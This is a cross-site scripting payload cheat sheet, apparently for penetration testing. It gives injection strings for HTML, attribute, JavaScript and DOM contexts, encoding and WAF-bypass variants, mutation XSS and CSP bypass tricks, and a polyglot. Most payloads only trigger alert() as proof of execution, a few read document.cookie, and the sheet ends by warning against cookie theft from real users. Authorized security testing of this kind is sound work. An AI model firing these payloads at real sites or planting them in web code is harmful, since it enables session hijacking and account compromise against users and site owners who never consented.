# XSS Payloads

Context is everything. Identify where your input lands (HTML body, attribute, JS string, URL, DOM sink) before firing. Break out of the current context first, then execute.

## Tier 1 — Context breakout probes
Cheap markers to learn the sink. Reflect a unique token first (e.g. `zqx931`), grep the response, read what encoding wraps it.
```
zqx931"'><svg/onload=alert(1)>
"><img src=x onerror=alert(1)>
'-alert(1)-'
</script><script>alert(1)</script>
javascript:alert(1)          # href/src sinks
```

## Tier 2 — Per-context execution
HTML body:
```
<svg/onload=alert(1)>
<img src=x onerror=alert(document.domain)>
<details/open/ontoggle=alert(1)>
```
Attribute (already inside `<input value="...">`):
```
" autofocus onfocus=alert(1) x="
"><svg onload=alert(1)>
```
JS string context (`var x = '...'`):
```
';alert(1);//
'-alert(1)-'
</script><svg onload=alert(1)>
```
DOM (client-side sink — trace `location`/`hash` → `innerHTML`/`eval`/`document.write`):
```
#<img src=x onerror=alert(1)>
javascript:alert(1)
';alert(document.cookie)//
```

## Tier 3 — Filter / WAF bypass
When tags/handlers/keywords are stripped or encoded.
```
<sVg OnLoad=alert(1)>                     # case
<svg><script>alert&#40;1&#41;</script>    # html-entity the parens
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">   # base64 payload
<a href="jav&#x09;ascript:alert(1)">x</a>          # tab in scheme
<svg onload=alert`1`>                     # backtick call, no parens
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
onerror=alert;throw 1                     # no-paren via throw
<xss id=x tabindex=1 onactivate=alert(1)></xss>    # obscure handler
```
Mutation XSS (mXSS) — abuse browser re-parsing after sanitizer:
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
```

## CSP notes
- Look for `unsafe-inline`, `unsafe-eval`, or wildcard/`*.googleapis.com` sources → often bypassable.
- JSONP endpoints on an allowlisted host = script gadget: `<script src="//allowed.host/jsonp?cb=alert(1)"></script>`.
- Missing `object-src 'none'` + `base-uri` → base tag hijack or plugin abuse.
- `strict-dynamic` present → hunt a whitelisted loader/gadget (AngularJS, etc.) instead of injecting a raw script.

## Polyglots
One string that fires across several contexts — good for spraying unknown sinks.
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Stop when
One `alert(document.domain)` (or a benign `console.log` / DNS callback) proves execution in the victim origin. Capture the request + rendered response. For stored XSS, show it fires for a *different* session/user. Do not weaponize with cookie theft against real users — a same-account `document.domain` popup is sufficient impact proof. Then stop.
